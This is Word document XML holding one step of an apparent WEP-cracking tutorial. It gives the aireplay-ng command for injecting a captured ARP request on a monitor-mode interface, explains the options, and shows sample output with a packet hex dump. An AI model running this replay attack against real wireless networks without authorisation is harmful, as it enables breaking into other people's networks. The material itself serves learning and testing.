    <w:p w14:paraId="6F754226" w14:textId="63478D3C" w:rsidR="004652D1" w:rsidRDefault="00590FC4" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 6</w:t>
      </w:r>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Inject the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00779FCC"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 xml:space="preserve">Using the console session where you generated the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet, enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F24C4F4" w14:textId="77777777" w:rsidR="006848FE" w:rsidRDefault="006848FE" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="083A0F7B" w14:textId="07B0107B" w:rsidR="004652D1" w:rsidRPr="008E353E" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</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-2 -r </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-request </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2838B9DB" w14:textId="77777777" w:rsidR="008D7BBE" w:rsidRPr="003112DC" w:rsidRDefault="008D7BBE" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3670A845"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF42218" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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-2 means use interactive frame selection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CCA55F" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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r</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-request defines the file name from which to read the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF0FF43" w14:textId="0A6F3594" w:rsidR="004652D1" w:rsidRDefault="00277615" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>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sidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> defines the interface to use</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7D6755"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F21859" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Size: 68, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 0, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 1 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269CDA89" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A788931" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2D340B52" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="40A31F8E" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:09:5B:EC:EE:F2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4CFE7176" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5853A4C4" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0000:  0841 0201 0014 6c7e 4080 0009 5bec eef2  .A</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....l</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>~@...[...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE4D86F" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0010:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8001 8f00 0000 7af3 8be4  ............z...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354FDD03" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0020:  c587 b696 9bf0 c30d 9cd9 c871 0f5a 38c5  ...........</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>q.Z8</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53DE88E4" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0030:  f286 fdb3 55ee 113e da14 fb19 17cc </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>0b5e  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>U..&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.......</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>^</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3673A3" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      0x0040:  6ada 92f2                                j...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FF01C5" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BB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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF395F7" w14:textId="77777777" w:rsidR="004652D1"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8D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="03C1431F" w14:textId="77777777" w:rsidR="008D7BBE" w:rsidRPr="008D7BBE" w:rsidRDefault="008D7BBE" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2ACD15CD"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 xml:space="preserve">Enter “y” to use this packet. The system responds by showing how many packets it is injecting and reminds you to start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> if it has not already been started:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CA109F" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Saving chosen packet in replay_src-0204-104917.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEC719D" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> You should also start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture replies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BCF634E" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
